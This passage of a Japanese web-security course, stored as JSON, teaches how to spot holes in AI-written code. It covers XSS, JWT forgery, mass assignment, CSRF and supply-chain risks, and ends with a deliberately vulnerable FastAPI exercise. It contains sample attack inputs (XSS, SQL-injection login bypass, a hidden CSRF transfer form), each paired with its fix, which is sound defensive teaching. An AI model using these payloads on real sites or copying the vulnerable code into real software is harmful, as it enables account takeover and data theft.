`onerror=\"...\"` のような書き方は実行されなくなります。エスケープの漏れがあっても止められる **多層防御**（レッスン 1）です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `el.innerHTML = 外からの値` / `` `<p>${name}</p>` `` を innerHTML へ | ⚠️ textContent にするか、エスケープ |\n| `el.textContent = name` | ✅ |\n| `dangerouslySetInnerHTML` / `v-html` / `\\| safe` / `mark_safe` | ⚠️ 中身がどこから来るか確認。外からならサニタイズ |\n| `marked(text)` の結果をそのまま innerHTML | ⚠️ Markdown にも HTML を書けるので、DOMPurify を通す |\n| `<a href=\"${url}\">` に外からの URL | ⚠️ `javascript:alert(1)` という URL も入れられる。`http:`・`https:` で始まるか確認 |\n| 自作の「`<script>` を消す」処理 | ⚠️ `onerror` などで抜けられる。ライブラリを使う |\n| ログインのトークンを localStorage に保存 | ⚠️ XSS が 1 つでもあれば盗まれる。HttpOnly の Cookie なら JavaScript から読めない |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
+     "quizzes": [
+      [
+       {
+        "question": "外から来た文字列 `name` を画面に表示するコードとして安全なのは？",
+        "choices": [
+         "`el.innerHTML = name`",
+         "`el.textContent = name`",
+         "`el.innerHTML = name.replace(\"<script>\", \"\")`"
+        ],
+        "answer": 1,
+        "explain": "textContent は HTML として解釈せず、文字として表示します。`<script>` を消すだけでは、`<img onerror=...>` などで抜けられます。"
+       },
+       {
+        "question": "React で `<p>{comment}</p>` と書いた場合と、`dangerouslySetInnerHTML={{ __html: comment }}` と書いた場合の違いは？",
+        "choices": [
+         "前者は自動でエスケープされて安全、後者は HTML として表示されるので外からの値には危険",
+         "どちらも同じ",
+         "前者が危険で、後者が安全"
+        ],
+        "answer": 0,
+        "explain": "React の `{}` は自動エスケープしてくれます。名前のとおり「危険」な dangerouslySetInnerHTML は、サニタイズ済みの値にだけ使います。"
+       },
+       {
+        "question": "ブログで「太字やリンクは使えるが、危ないものは消したい」ときの正しい方法は？",
+        "choices": [
+         "すべてエスケープする",
+         "自分で正規表現を書いて `<script>` を消す",
+         "DOMPurify などのサニタイズ用ライブラリを通してから表示する"
+        ],
+        "answer": 2,
+        "explain": "エスケープすると太字も文字になってしまいます。危ない部分だけを取り除くのがサニタイズで、抜け道が多いので専用のライブラリを使います。"
+       }
+      ]
+     ],
+     "id": "04-xss"
+    },
+    {
+     "title": "ログインとセッションの落とし穴",
+     "level": 3,
+     "minutes": 22,
+     "concepts": [
+      "security",
+      "auth",
+      "http_api"
+     ],
+     "summary": "署名を確かめない JWT、送られてきた is_admin をそのまま保存する、エラーメッセージで会員かどうかがばれる、総当たりし放題、CSRF。ログインの周りで AI が見落としやすい穴を、再現しながら。",
+     "body": "## このレッスンのゴール\n\n- JWT の署名を確かめないと、誰でも管理者になれてしまうことを説明できる\n- 「送られてきた値をそのまま保存する」（マスアサインメント）の危険と直し方が分かる\n- アカウントの列挙・総当たり・CSRF とその対策を知り、AI のコードで確認できる\n\nバックエンドコースのレッスン 9（認証と認可）・11（定番 10）・18（OAuth）で学んだ基本の、**一歩先の落とし穴** です。\n\n## ① 署名を確かめない JWT\n\nバックエンドコースのレッスン 9 で、「JWT の中身は誰でも読める。署名で改ざんを防ぐ」と学びました。では、**署名を確かめなかったら** どうなるでしょうか。\n\n```python\nimport jwt\ntoken = jwt.encode({\"sub\": \"2\", \"role\": \"user\"}, SECRET, algorithm=\"HS256\")\n# 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwicm9sZSI6InVzZXIifQ.plsq...'\n#   └ ヘッダー                         └ 中身（Base64）                      └ 署名\n```\n\n攻撃者は、真ん中の部分を `{\"sub\":\"1\",\"role\":\"admin\"}` に書き換えた偽のトークンを作れます（署名はそのまま）。\n\n```python\njwt.decode(forged, options={\"verify_signature\": False})\n# {'sub': '1', 'role': 'admin'}        ← ⚠️ そのまま信じてしまった\n\njwt.decode(forged, SECRET, algorithms=[\"HS256\"])\n# jwt.exceptions.InvalidSignatureError: Signature verification failed   ← ✅ 見破った\n```\n\n（PyJWT 2.15 で実際に試しました）\n\nAI のコードで `verify_signature: False` を見かけるのは、「とりあえず中身を読みたい」ときに書かれたものが残っている場合が多いです。**ログインの判定に使うなら、必ず署名を確かめます**。\n\n### `alg: none` の罠\n\nJWT のヘッダーには、署名の方式（`alg`）が書かれています。昔のライブラリには、ヘッダーに `\"alg\": \"none\"`（署名なし）と書かれていると、**署名を確かめずに受け入れてしまう** ものがありました。\n\n```python\njwt.decode(none_token, SECRET, algorithms=[\"HS256\"])\n# jwt.exceptions.InvalidAlgorithmError: The specified alg value is not allowed\n```\n\n今の PyJWT は、`algorithms=[\"HS256\"]` で **受け入れる方式を自分で決める** ので、`none` は拒否されます。`algorithms` を必ず指定するのがポイントです。\n\n## ② 送られてきた値をそのまま保存する（マスアサインメント）\n\nプロフィールの更新 API で、送られてきた JSON をそのまま反映するコードです。\n\n```python\nuser = {\"id\": 2, \"name\": \"ryo\", \"is_admin\": False}\nbody = {\"name\": \"Ryo\", \"is_admin\": True}          # ← 攻撃者が is_admin を勝手に足した\n\nuser.update(body)\n# {'id': 2, 'name': 'Ryo', 'is_admin': True}     ← ⚠️ 管理者になってしまった\n```\n\n画面には「名前」の欄しかなくても、**リクエストは自由に作れる**（レッスン 1）ので、`is_admin`・`role`・`price`・`user_id` などを足して送られます。\n\n### 直し方：変えてよい項目を決める\n\n```python\nALLOWED = {\"name\", \"bio\"}\nuser.update({k: v for k, v in body.items() if k in ALLOWED})\n# {'id': 2, 'name': 'Ryo', 'is_admin': False}    ← ✅ is_admin は無視された\n```\n\nFastAPI なら、**入力用のモデルを別に作る** のが定番です。\n\n```python\nclass ProfileUpdate(BaseModel):     # 利用者が変えてよいものだけ\n    name: str\n    bio: str | None = None\n\nclass User(BaseModel):              # データベースの中身（is_admin を含む）\n    id: int\n    name: str\n    bio: str | None\n    is_admin: bool\n\n@app.patch(\"/me\")\ndef update_me(data: ProfileUpdate, user: User = Depends(current_user)):\n    ...   # data には name と bio しか入らない（is_admin を送っても無視される）\n```\n\nORM で `User(**request.json)`、JavaScript で `Object.assign(user, req.body)` や `{ ...user, ...req.body }` を見たら、同じ穴を疑います。\n\n## ③ エラーメッセージで会員かどうかがばれる\n\n```text\n⚠️ 「そのメールアドレスは登録されていません」\n⚠️ 「パスワードが違います」\n```\n\nこの 2 つを出し分けると、攻撃者は **どのメールアドレスが会員か** を調べられます（アカウントの列挙）。会員だと分かったアドレスに、パスワードの総当たりやフィッシングメールを集中させます。\n\n```text\n✅ 「メールアドレスまたはパスワードが違います」\n✅ （パスワードリセット）「登録されていれば、メールを送りました」\n```\n\n## ④ 総当たりし放題\n\nログインの API に回数の制限が無いと、よくあるパスワードを 1 秒に何百回も試されます。\n\n| 対策 | 内容 |\n|---|---|\n| **レート制限** | 同じ IP・同じアカウントから、1 分に 5 回までなど（`slowapi`、`express-rate-limit`、Cloudflare の設定） |\n| 失敗が続いたら待たせる | 5 回失敗したら 15 分ロック、など。⚠️ 永久ロックは、他人にわざと失敗されて使えなくなる |\n| 2 段階認証（MFA） | パスワードが当たっても、もう 1 つの確認が必要 |\n| 漏れたパスワードの拒否 | 「password」「12345678」などを登録させない |\n\nパスワードリセットや確認コードの入力も、同じように制限が必要です。6 桁のコードは 100 万通りしかないので、制限が無ければ総当たりで当たります。\n\n## ⑤ CSRF：知らないうちに操作させられる\n\nあなたが銀行のサイトにログインしたまま、攻撃者の罠サイトを開いたとします。罠サイトには、こんなフォームが隠されています。\n\n```html\n<form action=\"https://bank.example/transfer\" method=\"POST\" id=\"f\">\n  <input name=\"to\" value=\"攻撃者の口座\">\n  <input name=\"amount\" value=\"100000\">\n</form>\n<script>document.getElementById(\"f\").submit()</script>\n```\n\nブラウザは、bank.example へのリクエストに **bank.example のログイン Cookie を自動で付けて** しまいます。銀行から見ると、本人からの正しい送金依頼に見えます。これが **CSRF**（クロスサイト・リクエスト・フォージェリ）です。\n\n| 対策 | 仕組み |\n|---|---|\n| Cookie に `SameSite=Lax`（または `Strict`） | 他のサイトからの POST には Cookie を付けない。今のブラウザの多くは、指定が無いと Lax 扱い |\n| CSRF トークン | フォームに、そのサイトだけが知っているランダムな値を入れ、サーバーで確かめる（Django・Rails などは標準装備） |\n| 大事な操作は再確認 | 送金・パスワード変更の前に、パスワードの再入力 |\n| 状態を変える操作に GET を使わない | `GET /delete?id=3` は、画像のタグ `<img src=\"...\">` だけで実行されてしまう |\n\nトークンを `Authorization` ヘッダーで送る API（ブラウザが自動で付けない）なら、CSRF は起きにくくなります。その代わり、トークンを JavaScript から読める場所に置くことになるので、XSS（レッスン 4）に注意が必要です。\n\n## Cookie の設定（おさらい）\n\n| 設定 | 守るもの |\n|---|---|\n| `HttpOnly` | JavaScript から読めない → XSS で盗まれにくい |\n| `Secure` | https のときだけ送る → 通信の途中で盗まれにくい |\n| `SameSite=Lax` | 他のサイトからのリクエストに付けない → CSRF |\n| 短めの有効期限・ログアウトで無効化 | 盗まれたときの被害を小さく |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `jwt.decode(..., options={\"verify_signature\": False})` | ⚠️ ログイン判定に使っているなら致命的 |\n| `jwt.decode(token, key)`（`algorithms` が無い） | ⚠️ PyJWT 2 では必須。他のライブラリでも方式を固定する |\n| `user.update(request.json)` / `User(**body)` / `Object.assign(user, req.body)` | ⚠️ マスアサインメント。入力用のモデルか許可リストに |\n| ログインのエラーが「登録されていません」「パスワードが違います」で分かれている | ⚠️ アカウントの列挙 |\n| `/login` にレート制限が無い | ⚠️ 総当たり |\n| `@app.get(\"/delete/{id}\")` | ⚠️ 状態を変える操作は POST / DELETE に |\n| `set_cookie(\"session\", ..., httponly=True, secure=True, samesite=\"lax\")` | ✅ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
+     "quizzes": [
+      [
+       {
+        "question": "`jwt.decode(token, options={\"verify_signature\": False})` の結果でログイン中のユーザーを決めている。何が起きる？",
+        "choices": [
+         "処理が速くなるだけで、問題はない",
+         "攻撃者が中身を書き換えた偽のトークンでも受け入れてしまい、誰にでもなりすませる",
+         "トークンの期限が切れなくなるだけ"
+        ],
+        "answer": 1,
+        "explain": "署名を確かめないと、`{\"sub\": \"1\", \"role\": \"admin\"}` のように書き換えた偽物を見破れません。実際に試すと、偽物の中身がそのまま返ってきました。"
+       },
+       {
+        "question": "プロフィール更新 API で `user.update(request.json)` としている。攻撃者がやりそうなことは？",
+        "choices": [
+         "名前を長くする",
+         "`is_admin: true` などをリクエストに足して、自分を管理者にする",
+         "何もできない（画面に is_admin の欄が無いので）"
+        ],
+        "answer": 1,
+        "explain": "リクエストは自由に作れるので、画面に無い項目も送れます。変えてよい項目だけを受け取るようにします。"
+       },
+       {
+        "question": "ログイン画面のエラーメッセージとして、もっとも適切なのは？",
+        "choices": [
+         "「このメールアドレスは登録されていません」",
+         "「パスワードが 1 文字違います」",
+         "「メールアドレスまたはパスワードが違います」"
+        ],
+        "answer": 2,
+        "explain": "どちらが違うかを出し分けると、どのメールアドレスが会員かを調べられてしまいます。"
+       }
+      ]
+     ],
+     "id": "05-auth-pitfalls"
+    },
+    {
+     "title": "依存ライブラリとサプライチェーン ― 自分で書いていないコードの守り方",
+     "level": 3,
+     "minutes": 18,
+     "concepts": [
+      "security",
+      "tooling",
+      "ai_coding"
+     ],
+     "summary": "アプリのコードの大半は、他人が書いたライブラリ。古いバージョンの脆弱性を pip-audit で実際に検出し、ロックファイル・自動更新・名前の似た偽物・AI が作り出す「存在しないパッケージ」への対策まで。",
+     "body": "## このレッスンのゴール\n\n- 依存ライブラリの脆弱性を、`pip-audit`・`npm audit` で調べる方法と、結果の読み方が分かる\n- ロックファイルとバージョンの固定の役割を説明できる\n- タイポスクワッティングや、AI が提案する「存在しないパッケージ」の危険に気づける\n\n## 自分のコードは氷山の一角\n\n`pip install fastapi` を 1 回実行すると、FastAPI が使う別のライブラリ（starlette・pydantic・anyio…）も一緒に入ります。JavaScript では `npm install` で何百ものパッケージが入ることも珍しくありません。\n\n```text\n自分のアプリ\n ├─ fastapi            ← 自分で選んだもの（直接の依存）\n │   ├─ starlette      ← fastapi が使うもの（間接の依存）\n │   └─ pydantic\n │       └─ ...\n └─ requests\n     ├─ urllib3\n     └─ idna\n```\n\n**アプリとして動くコードの大半は、他人が書いたもの** です。そこに穴があれば、自分のアプリにも穴があることになります。このように、材料（ライブラリ）の側から攻撃されることを **サプライチェーン攻撃** と呼びます。\n\n## 古いバージョンには、知られた穴がある\n\nライブラリの脆弱性は、見つかると番号（CVE・PYSEC・GHSA など）が付けられ、データベースで公開されます。`pip-audit` は、それと自分の依存を照らし合わせてくれます。\n\n```text\n$ cat requirements.txt\nrequests==2.19.0\n\n$ pip-audit -r requirements.txt --desc off\nFound 37 known vulnerabilities in 3 packages\nName     Version ID              Fix Versions\n-------- ------- --------------- -------------\nrequests 2.19.0  PYSEC-2018-28   2.20.0\nrequests 2.19.0  PYSEC-2023-74   2.31.0\n...\nurllib3  1.23    PYSEC-2023-212  1.26.18,2.0.7\n...\n```\n\n（2018 年の requests 2.19.0 で、実際に実行した結果の一部です）\n\n| 列 | 意味 |\n|---|---|\n| Name / Version | どのライブラリの、どのバージョンか。`urllib3` は自分で書いていないが、requests が連れてきた間接の依存 |\n| ID | 脆弱性の番号。検索すると内容が分かる |\n| Fix Versions | **このバージョン以上にすれば直る** |\n\n`requests` 1 つを古いまま使っただけで、**連れてきた urllib3・idna も含めて 37 件**（同じものの重複を含む）見つかりました。\n\n| 言語 | 調べるコマンド |\n|---|---|\n| Python | `pip-audit`（`pip install pip-audit`） |\n| JavaScript | `npm audit`（npm に最初から入っている） |\n| GitHub | **Dependabot**：リポジトリの設定で有効にすると、脆弱性のある依存を見つけて、更新の PR を自動で作ってくれる |\n\n⚠️ `npm audit fix --force` は、大きなバージョンアップ（互換性の無い変更）までまとめて行うので、アプリが動かなくなることがあります。更新した後はテストを実行します。\n\n## バージョンを固定する：ロックファイル\n\n```text\nrequests           ← ⚠️ 入れるたびに最新になる。昨日と今日で中身が違うかも\nrequests>=2.31     ← 2.31 以上なら何でも\nrequests==2.32.4   ← ✅ このバージョンだけ\n```\n\n直接の依存だけでなく、**間接の依存まで含めて、全部のバージョンを記録したファイル** が **ロックファイル** です。\n\n| 道具 | ロックファイル |\n|---|---|\n| npm | `package-lock.json` |\n| pnpm / yarn | `pnpm-lock.yaml` / `yarn.lock` |\n| uv / Poetry（Python） | `uv.lock` / `poetry.lock` |\n| pip | `pip freeze > requirements.txt`（簡易版） |\n\nロックファイルをコミットしておくと、**誰がいつインストールしても同じものが入ります**。「昨日まで動いていたのに、新しいバージョンが出て壊れた」「乗っ取られた最新版が入った」を防げます。\nその代わり、固定したままだと古くなっていくので、Dependabot などで **定期的に、確認しながら上げていく** のがセットです。\n\n## 偽物のパッケージ\n\n### タイポスクワッティング\n\n人気のパッケージと **1 文字違いの名前** で、悪意のあるパッケージを公開する手口です。\n\n```text\nrequests  ← 本物\nreqeusts  ← 偽物の例（打ち間違いを狙う）\npython-requests、requests-py ← それっぽい名前の偽物の例\n```\n\nインストールしただけで、パソコンの中の秘密（SSH の鍵、`.env`、ブラウザに保存されたパスワード）を送信するものが、実際に何度も見つかっています。Python・npm のパッケージは、インストールのときにプログラムを実行できるからです。\n\n### AI が「存在しないパッケージ」を提案する\n\nAI は、**もっともらしいけれど存在しないパッケージ名** を答えることがあります（AI と開発するコースの「ハルシネーション」）。攻撃者がその名前を先に登録しておくと、AI の提案どおりにインストールした人が被害にあいます。これは **スロップスクワッティング** と呼ばれ、AI での開発ならではの新しい危険です。\n\n### インストールする前に確かめること\n\n| 確認 | 方法 |\n|---|---|\n| 本当にあるか・公式か | PyPI（pypi.org）・npm（npmjs.com）のページを開く。公式ドキュメントからリンクされているか |\n| 使われているか | ダウンロード数、GitHub のスター、最終更新日 |\n| 名前は正確か | 1 文字ずつ見る。公式ドキュメントからコピーする |\n| 本当に必要か | 標準ライブラリや、すでに入っているもので足りないか |\n\n## 依存は少ないほど安全\n\nライブラリ 1 つを足すことは、**その作者と、その作者が使っているライブラリ全部を信用する** ということです。数行で書ける処理のために依存を増やさないのも、立派なセキュリティ対策です。\nこのサイトが、外部のライブラリを 3 つ（Markdown の変換・サニタイズ・コードの色付け）だけ、`site/vendor/` に、ファイルとして同梱しているのも、毎回ネットから取ってこない・増やさないための工夫です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `pip install 聞いたことのない名前` / `npm install ...` | PyPI・npm のページで、本物か・使われているかを確認 |\n| `requirements.txt` にバージョンの指定が無い | ⚠️ 入れるたびに変わる。固定するか、ロックファイルを使う |\n| `package-lock.json` を `.gitignore` に入れている | ⚠️ ロックファイルはコミットする |\n| 何年も前のバージョンが固定されたまま | ⚠️ `pip-audit` / `npm audit` で確認 |\n| `npm audit fix --force` を勧めてくる | ⚠️ 大きなバージョンアップを含む。実行後にテスト |\n| `<script src=\"https://どこかのCDN/...\">` | 配布元が乗っ取られると影響を受ける。`integrity=\"sha384-...\"`（中身が変わっていないかの確認）があると ✅ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
+     "quizzes": [
+      [
+       {
+        "question": "`pip-audit` の結果で `urllib3 1.23 ... Fix Versions 1.26.18` と出たが、自分は urllib3 をインストールした覚えがない。なぜ？",
+        "choices": [
+         "pip-audit の間違い",
+         "自分が入れた requests などが、urllib3 を間接の依存として連れてきたから",
+         "Python に最初から入っているから"
+        ],
+        "answer": 1,
+        "explain": "ライブラリは別のライブラリを使っています。間接の依存の脆弱性も、自分のアプリの脆弱性になります。"
+       },
+       {
+        "question": "ロックファイル（`package-lock.json` など）をコミットする主な理由は？",
+        "choices": [
+         "ファイルの容量を減らすため",
+         "間接の依存まで含めて、誰がいつインストールしても同じバージョンが入るようにするため",
+         "ライブラリを自動で最新にするため"
+        ],
+        "answer": 1,
+        "explain": "全部のバージョンが固定されるので、意図しない更新や、乗っ取られた最新版が入るのを防げます。更新は確認しながら別に行います。"
+       },
+       {
+        "question": "AI が「この処理には `fastjson-parser-pro` を使うとよいです」と提案してきた。まずすることは？",
+        "choices": [
+         "すぐに `pip install fastjson-parser-pro` を実行する",
+         "PyPI で本当に存在するか、公式のものか、使われているかを確認する（標準ライブラリで足りないかも考える）",
+         "AI が言うなら確実に存在するので、気にしない"
+        ],
+        "answer": 1,
+        "explain": "AI は存在しないパッケージ名を答えることがあり、その名前で悪意のあるパッケージが登録されている場合があります。インストールの前に確認します。"
+       }
+      ]
+     ],
+     "id": "06-dependencies"
+    },
+    {
+     "title": "総合演習 ― AI が書いた API の穴を探す",
+     "level": 4,
+     "minutes": 25,
+     "concepts": [
+      "security",
+      "backend",
+      "reading",
+      "ai_coding"
+     ],
+     "summary": "「動くけれど穴だらけ」の FastAPI のコードを読み、このコースで学んだ穴を探す。実際に攻撃して成功することを確かめ、直した版で同じ攻撃が防がれることまで確認する。",
+     "body": "## このレッスンのゴール\n\n- このコースのチェックポイントを使って、短い API のコードから脆弱性を見つけられる\n- 見つけた穴が「なぜ危ないか」「どう直すか」を、自分の言葉で説明できる\n- 直した後に、同じ攻撃で確かめるという進め方が分かる\n\n## 問題のコード\n\nAI に「メールアドレスとパスワードで登録・ログインできて、メモを見られる API を FastAPI で作って」と頼んだら、こんなコードが出てきたとします。**普通に使う分には、ちゃんと動きます**。\n\n```python\nimport hashlib, sqlite3\nfrom fastapi import FastAPI, Request\nfrom fastapi.responses import HTMLResponse\n\napp = FastAPI()\nSECRET_KEY = \"dev-secret-123\"\nconn = sqlite3.connect(\":memory:\", check_same_thread=False)\nconn.executescript(\"\"\"\nCREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, password TEXT, is_admin INTEGER DEFAULT 0);\nCREATE TABLE notes (id INTEGER PRIMARY KEY, owner_id INTEGER, body TEXT);\n\"\"\")\n\n@app.post(\"/signup\")\nasync def signup(request: Request):\n    data = await request.json()\n    pw = hashlib.md5(data[\"password\"].encode()).hexdigest()\n    cols = \", \".join(data.keys())\n    conn.execute(f\"INSERT INTO users ({cols}) VALUES ({', '.join('?' * len(data))})\",\n                 [pw if k == \"password\" else v for k, v in data.items()])\n    conn.commit()\n    return {\"ok\": True}\n\n@app.post(\"/login\")\nasync def login(request: Request):\n    data = await request.json()\n    pw = hashlib.md5(data[\"password\"].encode()).hexdigest()\n    row = conn.execute(\n        f\"SELECT id FROM users WHERE email = '{data['email']}' AND password = '{pw}'\"\n    ).fetchone()\n    if row is None:\n        return {\"error\": \"ログインできません\"}\n    return {\"user_id\": row[0]}\n\n@app.get(\"/notes/{note_id}\", response_class=HTMLResponse)\ndef show_note(note_id: int):\n    row = conn.execute(\"SELECT body FROM notes WHERE id = ?\", (note_id,)).fetchone()\n    return f\"<h1>メモ</h1><div>{row[0]}</div>\"\n```\n\n### ✏️ まず自分で探してみる\n\n先を読む前に、レッスン 1 の「見る順番」で探してみましょう。**8 個以上** あります。\n\n1. 外から来るデータはどこから入る？\n2. それは SQL・HTML にそのまま使われていない？\n3. パスワード・秘密の扱いは？\n4. 「誰が」「何を」してよいかを確かめている？\n5. 予想外の入力（無い ID など）で、どうなる？\n\n## 答え合わせ\n\n| # | 場所 | 穴 | レッスン |\n|---|---|---|---|\n| ① | `SECRET_KEY = \"dev-secret-123\"` | 秘密がコードに直接書かれている（Git に残る・短くて推測しやすい） | AI と開発するコース |\n| ② | `hashlib.md5(...)` | パスワードを MD5 で保存。盗まれたら総当たりですぐ戻される。ソルトも無い | 2 |\n| ③ | `signup` の `data.keys()` をそのまま列名に | **マスアサインメント**：`\"is_admin\": 1` を送れば管理者で登録できる | 5 |\n| ④ | 同じく `cols` を f 文字列で SQL に | 列名の部分に **SQL インジェクション**（キーの名前に SQL を仕込める） | 3 |\n| ⑤ | `login` の f 文字列の SQL | **SQL インジェクション**：パスワードを知らなくてもログインできる | 3 |\n| ⑥ | `show_note` の `f\"<div>{row[0]}</div>\"` | **XSS**：メモの中身の HTML がそのまま表示される | 4 |\n| ⑦ | `show_note` に、ログインや持ち主の確認が無い | **IDOR**：ID を変えるだけで、誰のメモでも読める | バックエンドコース 9 |\n| ⑧ | `row` が `None` のとき | 無い ID で `TypeError` → 500 エラー。エラーの詳細が漏れることもある | バックエンドコース 10 |\n| ⑨ | `email` が `UNIQUE` でない・型のチェックが無い | 同じメールアドレスで何人も登録できる。`password` が無いと `KeyError` | データベース設計コース |\n| ⑩ | `/login` に回数の制限が無い | 総当たりし放題 | 5 |\n\n## 実際に攻撃してみる\n\nFastAPI の `TestClient`（実際のサーバーを立てずにリクエストを送れる道具。バックエンドコースのレッスン 12）で、穴を突いてみました。\n\n```python\nc.post(\"/signup\", json={\"email\": \"ryo@example.com\", \"password\": \"hana-2027\"})\n\n# ③ マスアサインメント\nc.post(\"/signup\", json={\"email\": \"evil@example.com\", \"password\": \"x\", \"is_admin\": 1})\nconn.execute(\"SELECT email, is_admin FROM users\").fetchall()\n# [('ryo@example.com', 0), ('evil@example.com', 1)]      ← 管理者として登録できた\n\n# ⑤ SQL インジェクション\nc.post(\"/login\", json={\"email\": \"ryo@example.com' --\", \"password\": \"wrong\"}).json()\n# {'user_id': 1}                                         ← パスワードが違うのにログインできた\n\n# ⑥ XSS（メモに HTML が入っていた場合）\nc.get(\"/notes/1\").text\n# '<h1>メモ</h1><div><img src=x onerror=alert(1)></div>'   ← そのまま出てくる\n\n# ⑧ 無い ID\nc.get(\"/notes/999\").status_code\n# 500\n```\n\n⑤ の入力 `ryo@example.com' --` は、`'` でメールアドレスの文字列を閉じ、`--` で **後ろのパスワードの条件をコメントにして消して** います。SQL は `... WHERE email = 'ryo@example.com' --' AND password = '...'` になり、メールアドレスだけで判定されました。\n\n## 直した版\n\n```python\nimport html, os, sqlite3\nfrom argon2 import PasswordHasher\nfrom argon2.exceptions import VerifyMismatchError\nfrom fastapi import FastAPI, HTTPException, Header\nfrom fastapi.responses import HTMLResponse\nfrom pydantic import BaseModel, EmailStr\n\napp = FastAPI()\nSECRET_KEY = os.environ[\"SECRET_KEY\"]                                   # ① 環境変数から\nph = PasswordHasher()\nconn = sqlite3.connect(\":memory:\", check_same_thread=False)\nconn.executescript(\"\"\"\nCREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT NOT NULL UNIQUE,   -- ⑨ UNIQUE と NOT NULL\n                    password_hash TEXT NOT NULL, is_admin INTEGER NOT NULL DEFAULT 0);\nCREATE TABLE notes (id INTEGER PRIMARY KEY, owner_id INTEGER NOT NULL REFERENCES users(id), body TEXT NOT NULL);\n\"\"\")\n\nclass Credentials(BaseModel):                                           # ③⑨ 受け取るのはこの 2 つだけ\n    email: EmailStr\n    password: str\n\n@app.post(\"/signup\")\ndef signup(data: Credentials):\n    try:\n        with conn:\n            conn.execute(\"INSERT INTO users (email, password_hash) VALUES (?, ?)\",   # ④ 列は固定\n                         (data.email, ph.hash(data.password)))                        # ② Argon2\n    except sqlite3.IntegrityError:\n        raise HTTPException(409, \"登録できませんでした\")\n    return {\"ok\": True}\n\n@app.post(\"/login\")\ndef login(data: Credentials):\n    row = conn.execute(\"SELECT id, password_hash FROM users WHERE email = ?\",        # ⑤ プレースホルダ\n                       (data.email,)).fetchone()\n    try:\n        if row is None:\n            raise VerifyMismatchError\n        ph.verify(row[1], data.password)\n    except VerifyMismatchError:\n        raise HTTPException(401, \"メールアドレスまたはパスワードが違います\")   # どちらが違うか言わない\n    return {\"user_id\": row[0]}           # 実際はここでセッションや JWT を発行する\n\n@app.get(\"/notes/{note_id}\", response_class=HTMLResponse)\ndef show_note(note_id: int, x_user_id: int = Header()):    # 説明を短くするためヘッダーで受け取っている\n    row = conn.execute(\"SELECT body FROM notes WHERE id = ? AND owner_id = ?\",       # ⑦ 持ち主の確認\n                       (note_id, x_user_id)).fetchone()\n    if row is None:\n        raise HTTPException(404, \"メモが見つかりません\")                       # ⑧ 500 ではなく 404\n    return f\"<h1>メモ</h1><div>{html.escape(row[0])}</div>\"                    # ⑥ エスケープ\n```\n\n⚠️ `x_user_id` をヘッダーで受け取っているのは、**この演習を短くするため** です。本物のアプリでは、利用者が自由に書き換えられるヘッダーを信じてはいけません。ログインしたときに発行したセッションや、署名を確かめた JWT（レッスン 5）から取り出します。\n⑩ のレート制限は、`slowapi` などのライブラリや、Cloudflare などの手前の仕組みで足します（ここでは省略）。\n\n### 同じ攻撃で確かめる\n\n```text\n③ マスアサインメント   → [('ryo@example.com', 0), ('evil@example.com', 0)]   is_admin は無視された\n   同じメールで再登録   → 409\n⑤ SQL インジェクション → 422（メールアドレスの形ではないので、Pydantic が受け付けない）\n   パスワード違い       → {'detail': 'メールアドレスまたはパスワードが違います'}\n   存在しないユーザー   → {'detail': 'メールアドレスまたはパスワードが違います'}   ← 同じ文言\n⑥ XSS                  → <div>&lt;img src=x onerror=alert(1)&gt;</div>           文字として表示\n⑦ 他人のメモ           → 404\n⑧ 無い ID              → 404\n```\n\n（直した版を実際に動かして、上の攻撃をもう一度送った結果です）\n\n⑤ は Pydantic の形のチェックで先に止まりましたが、**本当の守りはプレースホルダ** です。メールアドレスの形をしていても、`?` で渡していれば命令にはなりません。**1 つの対策に頼らない**（多層防御）のがポイントです。\n\n### さらに一歩先\n\n存在しないユーザーのときは `ph.verify` を呼ばずにすぐ返しているので、**返事の速さ** で会員かどうかが分かってしまう可能性が残っています（Argon2 の確認は時間がかかるため）。気にする場合は、ユーザーがいないときもダミーのハッシュで `verify` を実行して、時間をそろえます。セキュリティは、このように **1 つ直すと次が見えてくる** ものです。\n\n## AI に頼むときのコツ\n\nこのコードは、「登録・ログイン・メモを見る API」という頼み方に、**機能としては正しく** 答えています。セキュリティは、頼まないと後回しにされがちです。\n\n```text\n✅ 頼み方の例\nFastAPI で登録・ログイン API を作ってください。\n- パスワードは Argon2 でハッシュ化\n- SQL は必ずプレースホルダ\n- 入力は Pydantic のモデルで、受け取る項目を限定\n- 他人のデータは見られないように、持ち主を確認\n- エラーメッセージでアカウントの有無が分からないように\n作った後、このコードの脆弱性を自分で 5 つ以上探して、直してください。\n```\n\nそして、出てきたコードは **このレッスンの表で、自分でも確認** します。AI の「直しました」も、実際に攻撃を送って確かめるのが確実です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
+     "quizzes": [
+      [
+       {
+        "question": "問題のコードの `/login` に `{\"email\": \"ryo@example.com' --\", \"password\": \"wrong\"}` を送るとログインできた。`--` の役割は？",
+        "choices": [
+         "メールアドレスの区切り",
+         "SQL のコメントの始まりで、後ろのパスワードの条件を無視させている",
+         "パスワードを空にする命令"
+        ],
+        "answer": 1,
+        "explain": "`--` から後ろはコメントになるので、`AND password = '...'` が消え、メールアドレスだけで判定されてしまいました。"
+       },
+       {
+        "question": "直した版で、`is_admin` を送っても管理者にならなくなったのは、どの変更のおかげ？",
+        "choices": [
+         "パスワードを Argon2 にしたから",
+         "入力を `Credentials`（email と password だけ）のモデルで受け取り、INSERT する列も固定したから",
+         "`html.escape` を使ったから"
+        ],
+        "answer": 1,
+        "explain": "受け取る項目を決めておけば、余計な項目は無視されます。マスアサインメントの対策です。"
+       },
+       {
+        "question": "直した版の `/notes/{note_id}` で、`WHERE id = ? AND owner_id = ?` にした目的は？",
+        "choices": [
+         "検索を速くするため",
+         "XSS を防ぐため",
+         "ログイン中の人のメモだけを返し、ID を変えて他人のメモを読まれないようにするため"
+        ],
+        "answer": 2,
+        "explain": "「その人のデータか」を確かめる認可のチェックです。無いと、ID を 1 つずつ変えるだけで全員のメモが読めてしまいます（IDOR）。"
+       }
+      ]
+     ],
+     "id": "07-review-exercise"
+    }
+   ],
